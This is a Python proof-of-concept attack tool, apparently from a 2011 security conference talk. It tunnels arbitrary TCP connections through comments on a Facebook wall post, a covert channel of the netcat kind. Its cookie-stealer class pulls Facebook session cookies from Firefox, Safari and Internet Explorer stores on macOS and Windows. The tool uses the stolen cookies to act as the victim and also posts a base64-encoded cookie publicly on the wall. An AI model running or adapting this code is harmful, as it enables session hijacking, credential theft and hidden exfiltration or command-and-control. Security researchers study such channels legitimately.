#!/usr/bin/python
# PoC regarding Convert Channels over FaceBook
# FaceCat = FaceBook NetCat
# Jose Selvi - jselvi[a.t]pentester[d0.t]es - http://www.pentester.es
# Version 0.1 - 02/Oct/2011 - SOURCE Conferences

# Libraries
import urllib2
import re
import base64
import time
import sys
import socket
import thread
import random
import errno
import zlib
from optparse import OptionParser

# FaceCat Class
class FaceCat:
	# Variable Definition	
	_headers = {}
	_cookie = ""
	_email = ""
	_fbid = ""
	_fbname = ""
	_myname = ""
	_sender = "S"	# Slave by Default
	_pipe_link = ""
	_pipe_wlink = ""
	_pipe_wdata = ""
	_newpost_link = ""
	_newpost_data = ""
	_delete_link = ""
	_seq = 0
	_ack = 0
	_vquote = [
	"IF YOU STRIKE ME DOWN I WHALL BECOME MORE POWERFUL THAT YOU CAN EVER IMAGINE",
	"THE CIRCLE IS NOW COMPLETE. WHEN I LEFT YOU, I WAS BUT THE LEARNER; NOW I AM THE MASTER",
	"DO OR DO NOT. THERE IS NO TRY",
	"WITH GREAT POWER, COMES GREAT RESPONSABILITY",
	"IF I'M NOT BACK IN 5 MINUTES, JUST WAIT LONGER",
	"YES I'M OLD. OLD ENOUGH TO REMEMBER WHEN THE MCP WAS JUST A CHESS PROGRAM!",
	"I KNOW KUNG FU",
	"FREE YOUR MIND",
	"FOLLOW THE WHITE RABBIT",
	"STOP TRYING TO HIT ME AND HIT ME!"
	]
	
	# Search Pipe Profile
	def _GetProfile( self ):
		# Get my name
		web = "http://m.facebook.com/profile.php"
		req = urllib2.Request( url=web, headers=self._headers )
                f = urllib2.urlopen(req)
		if not f:
			return
                content = f.read()
                f.close()
		# Find the link
		m = re.search( '<title>.*</title>', content )
		if not m:
			return
		link = m.group(0)
		# Split content
                aux = re.split( '>', link )[1]
		self._myname = re.split( '<', aux )[0]
		# Find share link
		m = re.search( 'composer_form\" action.*</form>', content )
		if not m:
                        return
                form = m.group(0)
		# Split content
		vform = re.split( '"', form )
		form_action = vform[2]
		form_fb_dtsg = vform[8]
		form_post_form_id = vform[16]
		self._newpost_link = "http://m.facebook.com" + form_action
		self._newpost_data = "id=composer_form&fb_dtsg=" + form_fb_dtsg + "&post_form_id=" + form_post_form_id + "&submit=Share&status="
		#########
		# Get the search results page
		web = "http://m.facebook.com/search?query="+self._email
		req = urllib2.Request( url=web, headers=self._headers )
		f = urllib2.urlopen(req)
		if not f:
			return
		content = f.read()
		f.close()
		# Find the link
		m = re.search( '/profile.php\?id=\d+', content )
		if m:
			link = m.group(0)
			# Split the FaceBook ID
			vfbid = re.split( '=', link )
			# Find the name
			m = re.search( 'profile.php\?id=.*connect.php', content )
			name = m.group(0)
			# Split UserName
			name = re.split( "<span>", name )[1]
			name = re.split( "</span>", name )[0]
			# Store & Return
			self._fbid = vfbid[1]
			self._fbname = name
		else:
			self._fbid = 0
			self._fbname = self._myname
		return

	# Create Wall
	def _CreateWall( self ):
		# We need to be the owner
		if self._fbid != 0:
			return
		# Create Post so I'm the master
		self._sender = "M"
		# Select Quote
		quote = random.choice( self._vquote )
                # Link and Post Data
		cookie = base64.b64encode( self._cookie )
                cookie = re.sub( '\+', '%2B', cookie )
		web = self._newpost_link
                data = self._newpost_data + "- " + quote + " - [" + cookie + "]"
		# Write Share
                if options.verbose:
                	print "Creating new pipe"
		req = urllib2.Request( url=web, data=data, headers=self._headers )
                f = urllib2.urlopen(req)
                f.close()
		# Get Wall
		return self._GetWall()

	# Delete Wall
	def _DeleteWall( self ):
		# Imports
		import urllib2
		import re
		# We need to be the owner
		if self._fbid != 0:
			return
		# Get Post
		web = self._delete_link
		# Press delete button
		req = urllib2.Request( url=web, headers=self._headers )
		f = urllib2.urlopen(req)
                content = f.read()
		f.close()
		# Search confirmation link
		m = re.search( '"/a/delete.php\?.*"', content )
                if not m:
                        return
                delete = m.group(0)
		# Split the Delete Link
                deletelink = re.split( '"', delete )[1].replace("&amp;","&")
                web = "http://m.facebook.com" + deletelink
		# Confirm delete
		req = urllib2.Request( url=web, headers=self._headers )
                f = urllib2.urlopen(req)
                f.close()
		return

	# Search Wall
	def _GetWall( self ):
		# Get the Wall Posts
		if self._fbid != 0:
			web = "http://m.facebook.com/wall.php?id="+self._fbid
		else:
			web = "http://m.facebook.com/wall.php"
		req = urllib2.Request( url=web, headers=self._headers )
		f = urllib2.urlopen(req)
		if not f:
			return
		content = f.read()
		f.close()
		# Search "Comments", "See More" or Cookie
		m1 = re.search( '"/story.php\?story_fbid=.*"', content )
		m2 = re.search( '</strong></a>.*[a-zA-Z0-9+/=]+\]', content )
		# None of them? No post
		if not m1 and not m2:
			# No post? Create One
			return self._CreateWall()
		# "Comments" or "See More"
		if m1:
			# Get new URL
			post = m1.group(0)
                	postlink = re.split( '"', post )[1].replace("&amp;","&")
			auxweb = "http://m.facebook.com" + postlink
			req = urllib2.Request( url=auxweb, headers=self._headers )
			f = urllib2.urlopen(req)
                        if not f:
                                return
                        content = f.read()
                        f.close()
		# Cookie
		if m1 or m2:
			# Remove HTML Tags
                	content = re.sub( '<[a-zA-Z \"\'=/_?]+>', '', content )
                	content = re.sub( ' ', '', content )
			# Get the cookie
			m = re.search( '-\[[a-zA-Z0-9+/=]+\]', content )
			if not m:
				# No? Sure? Error!
				return
			# Decode Cookie
			aux = re.split( '\[', m.group(0) )[1]
			cookie64 = re.split( '\]', aux )[0]
			cookie = base64.b64decode( cookie64 )
			# Set new cookie
			self._cookie = cookie
			self._headers = self._CreateHeader( cookie )
			self._fbid = 0
		
		# Get the Wall with new Cookie
		req = urllib2.Request( url=web, headers=self._headers )
                f = urllib2.urlopen(req)
                if not f:
                        return
                content = f.read()
                f.close()
		# Find the post
		m = re.search( '"/story.php\?story_fbid=.*"', content )
		if not m:
			# No? Sure? Error!
			return
                post = m.group(0)
		# Split the Post Link
		postlink = re.split( '"', post )[1].replace("&amp;","&")
		self._pipe_link = "http://m.facebook.com" + postlink
		# Find the Delete link
		m = re.search( '"/delete.php\?.*"', content )
		if not m:
			return
		delete = m.group(0)
		# Split the Delete Link
		deletelink = re.split( '"', delete )[1].replace("&amp;","&")
		self._delete_link = "http://m.facebook.com" + deletelink
		# Go to Comments "Comment"
		web = "http://m.facebook.com" + postlink
		req = urllib2.Request( url=web, headers=self._headers )
		f = urllib2.urlopen(req)
                content = f.read()
                f.close()
		# Find the write comment script
		m = re.search( '<form .*</form>', content )
		form = m.group(0)
		vform = re.split( '"', form )
		form_id = vform[3]
		form_action = vform[5].replace("&amp;","&")
		form_fb_dtsg = vform[11]
		form_post_form_id = vform[19]
		# Store & Return
		self._pipe_link = "http://m.facebook.com" + postlink
		self._pipe_wlink = "http://m.facebook.com" + form_action
		self._pipe_wdata = "id="+form_id+"&fb_dtsg="+form_fb_dtsg+"&post_form_id="+form_post_form_id+"&comment_text="
		return

	# Create Header with Cookie
	def _CreateHeader( self, cookie ):
		header = { 'Cookie': cookie, 'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; es-ES; rv:1.9.2.20) Gecko/20110803 Firefox/3.6.20 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' }
		return header
	
	# Listener Constructor
        def __init__( self, email=None, cookie=None ):
		if email and cookie:
			self.open( email, cookie )

	# Destructor
	def __del__( self ):
		self.close()

	# Open New Connection
	def open( self, email, cookie ):
		self._cookie = cookie
		self._headers = self._CreateHeader( cookie )
		self._email = email
                self._GetProfile()
                self._GetWall()

	# Close Connection
	def close( self ):
		self._DeleteWall()

	# Read Pipe-Wall
        def read( self ):
                # Read Comments Page
		web = self._pipe_link
		req = urllib2.Request( url=web, headers=self._headers )
                f = urllib2.urlopen(req)
                content = f.read()
                f.close()
		# Get Comments
		m = re.search( '<strong>.*</strong>.*<abbr>', content )
                posts = m.group(0)
		# Split Content
		vcontent = re.split( '<strong>', posts )
		newdata = ""
		for i in range(len(vcontent)):
			# Ignore Blank
			if len(vcontent[i]) == 0:
				continue
			# Split the end of the string
			aux = re.split( '</strong>', vcontent[i] )[1]
			vcontent[i] = re.split( '<abbr>', aux )[0]
			# Remove HTML Tags
			vcontent[i] = re.sub( '<[a-zA-Z \"\'=/_?]+>', '', vcontent[i] )
			vcontent[i] = re.sub( ' ', '', vcontent[i] )
			# Check Base64
			if re.match( '\[(M|S)\]\[[0-9]+\][a-zA-Z0-9+/=]+', vcontent[i] ):
				aux = re.split( '\[', vcontent[i] )[1]
                                sender = re.split( '\]', aux )[0]
				# Ignore my comments
				if sender == self._sender:
					continue
				aux = re.split( '\[', vcontent[i] )[2]
				ack = int(re.split( '\]', aux )[0])
				if self._ack == ack:
					self._ack += 1
					newdata = re.split( '\]', vcontent[i] )[2]
					break
		# Return None if no data
		if len(newdata) == 0:
			return
		# Decode Base64 and Decompress
		if options.verbose:
			print "RX " + str(len(vcontent[i])) + " BYTES"
		newdata = base64.b64decode( newdata )
		newdata = zlib.decompress( newdata )
		# Get new write link
                m = re.search( '<form .*</form>', content )
                form = m.group(0)
                vform = re.split( '"', form )
                form_id = vform[3]
                form_action = vform[5].replace("&amp;","&")
                form_fb_dtsg = vform[11]
                form_post_form_id = vform[19]
                # Store new write link
                self._pipe_wlink = "http://m.facebook.com" + form_action
                self._pipe_wdata = "id="+form_id+"&fb_dtsg="+form_fb_dtsg+"&post_form_id="+form_post_form_id+"&comment_text="
		# Return
		return newdata

	# Write Pipe-Wall
	def write( self, data ):
		web = self._pipe_wlink
		# Compress and Encode Data
		newdata = zlib.compress( data )
		newdata = base64.b64encode( newdata )
		if options.verbose:
			print "WX " + str(len(newdata)) + " BYTES"
		# Encode URL
		newdata = re.sub( '\+', '%2B', newdata )
		# Post Data
		value = "[" + self._sender + "][" + str(self._seq) + "]" + newdata
		newdata = self._pipe_wdata + value
		# If data is too long, split!
                if len(value) > 8000:
                        l = len(data)
                        half = l / 2
                        self.write( data[:half] )
                        self.write( data[half:] )
                        return
		if options.verbose:
                        print "WX " + str(len(value)) + " BYTES"
		# Seq++
		self._seq += 1
		# Write Comment
		req = urllib2.Request( url=web, data=newdata, headers=self._headers )
		f = urllib2.urlopen(req)
                content = f.read()
                f.close()

# FaceBookCookieStealer Class
class FaceBookCookieStealer:
	
	#
	# By Browser
	#
       
	# Get FaceBook Cookie from Firefox (Generic)
        def get_chrome_cookie( self, cookie_file ):
		# COMMING SOON...
		return
 
	# Get FaceBook Cookie from Firefox (Generic)
        def get_firefox_cookie( self, cookie_file ):
                # Libraries
                import sqlite3
                # Open SQLite Database
                conn = sqlite3.connect( cookie_file )
                c = conn.cursor()
                # Search FaceBook Cookie
                c.execute("select name,value from moz_cookies where host='.facebook.com'")
                cookie = ""
                for row in c:
                        cookie += row[0] + "=" + row[1] + "; "
                # Close Database
                c.close()
                # Return Cookie
                if len(cookie) == 0:
                        return
                else:
                        return cookie

	# Get FaceBook Cookie from Safari (Generic)
	def get_safari_cookie( self, cookie_file ):
	        # Libraries
	        import plistlib
	        # Get PLIST structure
	        cookies = plistlib.readPlist( cookie_file )
	        # Transform PLIST to Cookie
	        cookie = ""
	        for vcookie in cookies:
			if vcookie['Domain'] == ".facebook.com":
                        	cookie += vcookie['Name'] + "=" + vcookie['Value'] + "; "
        	# Return Cookie
        	if len(cookie) == 0:
        	        return
        	else:
        	        return cookie

	# Get FaceBook Cookie from Internet Explorer (Generic)
	def get_internet_explorer_cookie( self, cookie_file ):
		# Libraries
                import os
                cookie = ""
                # Open File
                f = open( cookie_file, 'r' )
                # Read File
                filecontent = f.read().split('*\n')
                # Read Each Parameter
                for vect in filecontent:
                	if len(vect) == 0:
                        	continue
                        v = vect.split('\n')
                        if (len(v) > 2) and (v[2] == "facebook.com/"):
                        	cookie += v[0] + "=" + v[1] + "; "
                # Close File
                f.close()
                # Exit if Cookie is found
                if len(cookie) != 0:
                	return cookie
		return

	#
	# By Operating System and Browser
	#

	# Get FaceBook Cookie from Chrome in Mac OS X
        def get_chrome_macosx_cookie( self ):
		# COMMING SOON...
		return

	# Get FaceBook Cookie from Safari in Mac OS X
	def get_safari_macosx_cookie( self ):
	        # Libraries
	        import os
	        # Get plist file
	       	cookie_file = os.path.expanduser("~/Library/Cookies/Cookies.plist")
	        # Check if exists
	        if not os.path.exists( cookie_file ):
	                return
	        # Return Cookie
	        return self.get_safari_cookie( cookie_file )

	# Get FaceBook Cookie from Firefox in Mac OS X
	def get_firefox_macosx_cookie( self ):
	        # Libraries
	        import os
	        # Get Firefox Profiles
	        DIR = os.path.expanduser("~/Library/Application Support/Firefox/Profiles")
	        for profile in os.listdir(DIR):
	                # SQLite Path
	                cookie_file = DIR + "/" + profile + "/cookies.sqlite"
	                # Get Cookie
	                cookie = self.get_firefox_cookie( cookie_file )
	                # Exit if Cookie is found
	                if cookie:
	                        return cookie
	        # Return null if no cookie
	        return

	# Get FaceBook Cookie from Chrome in Linux
        def get_chrome_linux_cookie( self ):
                # COMMING SOON...
                return

	# Get FaceBook Cookie from Firefox in Linux
	def get_firefox_linux_cookie( self ):
		# COMMING SOON...
		return
	        # Libraries
	        import os
	        # Get Firefox Profiles
	        dir = os.path.expanduser("~/.mozilla/firefox")
	        for profile in os.listdir(dir):
	                if not 'default' in profile:
	                        continue
	                # SQLite Path
	                cookie_file = dir + "/" + profile + "/cookies.sqlite"
	                # Get Cookie
	                cookie = self.get_firefox_cookie( cookie_file )
	                # Exit if Cookie is found
	                if cookie:
	                        return cookie
	        # Return null if no cookie
	        return

	# Get FaceBook Cookie from Chrome in Windows
        def get_chrome_windows_cookie( self ):
                # COMMING SOON...
                return

        # Get FaceBook Cookie from Firefox in Windows
        def get_firefox_windows_cookie( self ):
                # COMMING SOON...
                return

	# Get FaceBook Cookie from Internet Explorer in Windows
        def get_ie_windows_cookie( self ):
                # Libraries
                import os
                # Get Firefox Profiles
		w7_path = os.path.expanduser("~\AppData\Roaming\Microsoft\Windows\Cookies\Low")
		xp_path = os.path.expanduser("~\Cookies")
		if os.path.exists(w7_path):
			cookie_path = w7_path
                elif os.path.exists(xp_path):
			cookie_path = xp_path
		else:
			return
		for filename in os.listdir(cookie_path):
                        # File Path
                        cookie_file = cookie_path + "\\" + filename
                        # Read Cookie
                        cookie = self.get_internet_explorer_cookie( cookie_file )
                        # Exit if Cookie is found
                        if cookie:
                                return cookie
                # Return null if no cookie
                return

        #
        # By Operating System and Browser
        #
	def get_cookie( self ):
		# Library
		import sys
		os_txt = ""
		browser_txt = ""
		cookie = ""
		# Get OS
		os_platform = sys.platform
		if os_platform == 'darwin':
        		os_txt = "MAC OS X Detected..."
			# Try Browsers
			cookie = self.get_chrome_macosx_cookie()
			if cookie:
				browser_txt = "Chrome FaceBook Cookies!"
				return [os_txt, browser_txt, cookie]
        		cookie = self.get_firefox_macosx_cookie()
			if cookie:
				browser_txt = "Firefox FaceBook Cookies!"
				return [os_txt, browser_txt, cookie]
			cookie = self.get_safari_macosx_cookie()
			if cookie:
				browser_txt = "Safari FaceBook Cookies!"
				return [os_txt, browser_txt, cookie]
		elif (os_platform == 'linux') or (os_platform == 'linux2'):
        		os_txt = "LINUX Detected..."
			# Try Browsers
			cookie = self.get_chrome_linux_cookie()
			if cookie:
				browser_txt = "Chrome FaceBook Cookies!"
				return [os_txt, browser_txt, cookie]
			cookie = self.get_firefox_linux_cookie()
			if cookie:
				browser_txt = "Firefox FaceBook Cookies!"
				return [os_txt, browser_txt, cookie]
		elif os_platform == 'win32':
        		os_txt = "WINDOWS Detected..."
			# Try Browsers
			cookie = self.get_chrome_windows_cookie()
			if cookie:
				browser_txt = "Chrome FaceBook Cookies!"
				return [os_txt, browser_txt, cookie]
        		cookie = self.get_firefox_windows_cookie()
			if cookie:
				browser_txt = "Firefox FaceBook Cookies!"
				return [os_txt, browser_txt, cookie]
        		cookie = self.get_ie_windows_cookie()
			if cookie:
				browser_txt = "Internet Explorer FaceBook Cookies!"
				return [os_txt, browser_txt, cookie]
		else:
			# Not Detected. Return Error
			return


###
### Main
###

# Get Parameters
usage = "usage: %prog [options]"
parser = OptionParser(usage=usage)
parser.add_option("-w", "--wall", type="string", dest="wall", help="wall pipe account")
parser.add_option("-c", "--host", type="string", dest="host", default="0.0.0.0", help="connection host")
parser.add_option("-p", "--port", type="int", dest="port", default=4444, help="listening or connection port")
parser.add_option("-v", "--verbose", action="store_true", dest="verbose", default=False, help="verbose output")
(options, args) = parser.parse_args()
if not options.wall or not options.port:
	parser.print_help()
	exit()

try:
	# Get FaceBook Cookie
	fcs = FaceBookCookieStealer()
	v = fcs.get_cookie()
	if not v:
		print "ERROR! No FaceBook Cookie!"
		exit()
	os_txt = v[0]
	browser_txt = v[1]
	cookie = v[2]
	if options.verbose:
		print os_txt
		print browser_txt

	# FaceCat Creation
	fc = FaceCat()
	if not fc:
		print "Error creating FaceCat object!"
		exit

	# Listen or Connect Socket
	res = socket.getaddrinfo( options.host, options.port, socket.AF_UNSPEC, socket.SOCK_STREAM, 0, socket.AI_PASSIVE)[0]
	af = res[0]
	socktype = res[1]
	proto = res[2]
	sa = res[4]
	s = socket.socket( af, socktype, proto )
	if options.host == '0.0.0.0':
		s.bind(sa)
		s.listen(5)
	else:
		s.connect( (options.host, options.port) )
	while 1:
		# FaceCat Open
		if options.verbose:
                        print "Creating FaceCat Object"
		fc.open( options.wall, cookie )
		if not fc:
                	print "Error creating FaceCat object!"
                	break
		if options.verbose and options.host == '0.0.0.0':
			print "SOCKET IS LISTENING (0.0.0.0:" + str(options.port) + ")..."
		if options.verbose and options.host != '0.0.0.0':
			print "SOCKET IS CONNECTING (" + options.host + ":" + str(options.port) + ")..."
		if options.host == '0.0.0.0':
			conn, addr = s.accept()
		else:
			conn = s
		if options.verbose:
			print "CONNECTION!"
		# Read Threat
		def read_relay( conn ):
			while 1:
				try:
					data = conn.recv(16000)
				except:
					print "Socket Closed"
					break
				fc.write( data )
				if len(data) == 0:
					fc.close()
					break
		# Read Channel
		if options.verbose:
			print "READ CHANNEL ON..."
		thread.start_new_thread( read_relay, (conn, ) )
		# Write Channel
		if options.verbose:
			print "WRITE CHANNEL ON..."
		while 1:
			data = fc.read()
			if data:
				if len(data) == 0:
					conn.close()
					break
				try:
					conn.send( data )
				except:
					break
			else:
				time.sleep( 0.1 )
		if options.verbose:
			print "Closing FaceCat Object"
		
		fc.close()
		break

except KeyboardInterrupt:
	if options.verbose:
		print "Closing FaceCat Script"
	exit

except:
	if options.verbose:
		print "Closing FaceCat Script"
